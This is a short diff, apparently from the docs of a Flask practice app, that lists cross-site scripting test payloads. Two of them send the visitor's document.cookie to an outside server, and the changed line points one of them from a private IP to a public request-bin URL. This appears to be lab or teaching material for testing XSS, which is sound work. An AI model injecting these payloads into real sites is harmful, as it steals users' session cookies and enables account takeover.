@@ -65,5 +65,5 @@ flask run
 
 <script>alert('test');</script>
 <script>document.write('<img src="http://localhost/submitcookie.php?cookie=' + escape(document.cookie) + '" />');</script>
-<script>new Image().src="http://192.168.1.80/b.php?cookie="+document.cookie;</script>
+<script>new Image().src="http://ptsv2.com/t/jyla7-1542967356/b.php?cookie="+document.cookie;</script>
 """
